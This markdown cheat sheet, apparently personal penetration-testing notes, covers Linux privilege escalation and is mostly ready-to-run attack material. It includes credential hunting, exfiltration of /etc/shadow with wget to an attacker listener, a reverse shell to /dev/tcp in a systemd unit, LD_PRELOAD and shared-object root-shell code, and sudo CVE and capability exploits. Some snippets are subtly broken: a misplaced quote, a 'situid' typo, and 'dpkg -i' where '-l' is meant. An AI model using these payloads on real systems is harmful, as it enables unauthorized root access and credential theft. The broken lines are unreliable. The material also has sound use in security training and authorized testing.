# Linux Privilege Escalation for Beginners

Enumeration checklist: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

Payloads all the Things: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

Checklist by PEASS: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

## SSH

Allowing deprecated ssh algorithms: 
- `ssh -o HostKeyAlgorithms=ssh-rsa -o PubKeyAcceptedAlgorithms=ssh-rsa [user]@[ip]`

## Manual enumeration

Kernel: 
- `uname -a`
- `cat /proc/version`

Distribution: `cat /etc/issue`
Architecture CPU: `lscpu`
Services: 
- `ps aux`
- `ps aux | grep root`

History: `history`
User(s): 
- `whoami`
- `id`
- `cat /etc/passwd`
- `cat /etc/passwd | cut -d : -f 1`
- `cat /etc/group`

SUDO: `sudo -l`
SUID:
- `find / -perm -u=s -type f 2>/dev/null`
- `find / -perm -u=s -type f -ls 2>/dev/null`

Environmental variables: `env`
Capabilities: `getcap -r / 2>/dev/null`
IP: 
- `ifconfig`
- `ip a`

Network communication:
- `route`
- `ip route`
- `arp -a`
- `ip neigh`

Open ports: `netstat -ano`

Passwords: 
- `cat /etc/shadow`
- `ls -la /etc/passwd`
- `ls -la /etc/shadow`
- `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`
- `grep --color=auto -rnw '/' -ie "PASS=" --color=always 2> /dev/null`
- `find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;` (Searches current folder)
- `locate password | more`
- `locate passwd | more`
- `locate pass | more`
- `locate pwd | more`

SSH keys:
- `find / -name authorized_keys 2> /dev/null`
- `find / -name id_rsa 2> /dev/null`


## Automated enumeration tools

Github URLs:
- LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- Linux Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester
- Linux Priv Checker: https://github.com/sleventyeleven/linuxprivchecker


## Kernel exploits

Github: https://github.com/lucyoa/kernel-exploits

Use `uname -a` and google the distribution version for kernel exploits.


## Passwords & File Permissions

Cat out files that may have passwords.

Looking at `/etc/passwd` and `/etc/shadow`.

Look for SSH keys and abuse them:
- `nano id_rsa`
- `chmod 600 id_rsa`
- `ssh -i id_rsa -o HostKeyAlgorithms=ssh-rsa -o PubKeyAcceptedAlgorithms=ssh-rsa root@[ip]`

Can be used to pivot to different parts of the network!


## SUDO

### Shell escape

GTFOBins (old): https://web.archive.org/web/20260102075820/https://gtfobins.github.io/

GTFOBins (new): https://gtfobins.org/


### Intended functionality

Examples: 
- `sudo apache2 -f /etc/shadow`
- `sudo wget --post-file=/etc/shadow [ip]:[port]`
    - `nc -nvlp [port]`


### LD_PRELOAD

Steps:
- `nano shell.c`
- `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
- `sudo LD_PRELOAD=[full-path]/shell.so [any NOPASSWD sudo]`

Contents of `shell.c`:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

### CVEs

CVE-2019-14287: `(ALL, !root) /bin/bash`
- `sudo -u$-1 /bin/bash`

CVE-2019-18634: `env_reset,pwfeedback` Feedback `*` when entering password
- https://github.com/saleemrashid/sudo-cve-2019-18634
- `gcc -o exploit exploit.c`
- Enabled by default on Mint and ElementaryOS


## SUID

systemctl:
- Create `root.service`
- `/bin/systemctl enable [full-path]/root.service`
- `/bin/systemctl start root`

Contents of `root.service`:
```
[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[ip]/[port] 0>&1'
 
[Install]
WantedBy=multi-user.target
```

### Shared Object Injection

Use `strace`:
- `strace [SUID-path] 2>&1 | grep -i -E "open|access|no such file"`

Inject `C`-code.
- `nano [file].c`
- `gcc -shared -fPIC [file].c -o [path-to-non-existent-file]/[file].so`

Contents of `[file].c`:
```
#include <stdio.h> 
#include <stdlib.h>
 
static void inject() __attribute__((constructor));
 
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p)";
}
```

### Binary symlinks (nginx)

Vulnerability in nginx. Can compromise server from user www-data.

In exploit suggester: 
- `nginxed-root.sh`
- Run `./nginxed-root.sh /var/log/nginx/error.log`
- Wait for nginx to rotate (daily)

Manual discovery (Look for nginx version <= 1.6.2):
- `dpkg -i | grep nginx`
- `find / -type f -perm -04000 -ls 2>/dev/null` (requires SUID bit on sudo)
- `ls -la /var/log/nginx` (Must have rwx)
- Create a symlink to replace the logfiles

### Environmental variables

SUID enabled binary uses a command in PATH

Create a service: `echo 'int main() { setgid(0); situid(0); system("/bin/bash"); return 0; }' > /tmp/[binary].c`

Compile: `gcc /tmp/[binary].c -o /tmp/[binary]`

Change PATH: `export PATH=/tmp:$PATH`

If a path is used:
- `function [full-path]() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
- `export -f [full-path]`


## Capabilities

Similar in concept to SUIDs. Starting from kernel 2.2.

Required to have `cap_setuid+ep` on capability in enumeration

For python capability: `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`